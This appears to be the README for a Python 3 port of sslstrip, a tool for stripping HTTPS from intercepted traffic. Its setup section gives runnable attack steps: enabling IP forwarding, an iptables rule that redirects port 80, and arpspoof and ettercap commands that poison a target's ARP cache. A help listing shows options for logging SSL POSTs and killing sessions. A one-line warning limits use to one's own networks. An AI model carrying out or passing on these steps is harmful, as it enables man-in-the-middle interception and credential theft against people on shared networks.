# sslstrip3_python3
implementation of moxie marlinspikes sslstrip in python3 

# Requirements:

apt install python3\
apt install arpspoof
pip install twisted\
pip install python-twisted-web\
pip install service_identity-23.1.0-py3-none-any.whl #this is in the requirements folder with this repo -- https://pypi.org/project/service_identity/#files

# Running:
        sslstrip can be run from the source base without installation.
        Just run 'python sslstrip.py -h' as a non-root user to get the
        command-line options.

        The steps to getting this working (assuming you're running Linux)
        are:

        1) Flip your machine into forwarding mode (as root):
           echo "1" > /proc/sys/net/ipv4/ip_forward

        2) Setup iptables to intercept HTTP requests (as root):
           iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>

        3) Run sslstrip with the command-line options you'd like (see above).

        4) Run arpspoof to redirect traffic to your machine (as root):
           arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>

        5) alternative if arpspoof not available is to use ettercap
           ettercap -T -S -q -M arp:remote -i <interface> /<ipaddr_client>// /<ipaddr_router>//

# Output: 
```
python3 sslstrip.py --help

sslstrip 0.9 by Moxie Marlinspike
Usage: sslstrip <options>

Options:
-w <filename>, --write=<filename> Specify file to log to (optional).
-p , --post                       Log only SSL POSTs. (default)
-s , --ssl                        Log all SSL traffic to and from server.
-a , --all                        Log all SSL and HTTP traffic to and from server.
-l <port>, --listen=<port>        Port to listen on (default 10000).
-f , --favicon                    Substitute a lock favicon on secure requests.
-k , --killsessions               Kill sessions in progress.
-h                                Print this help message.
```

# information
dont forget to remove the iptables config afterwards and to stop arpspoof or ettercap

# warning
ssl stripping is prohibited, only try this on your own machines and networks.
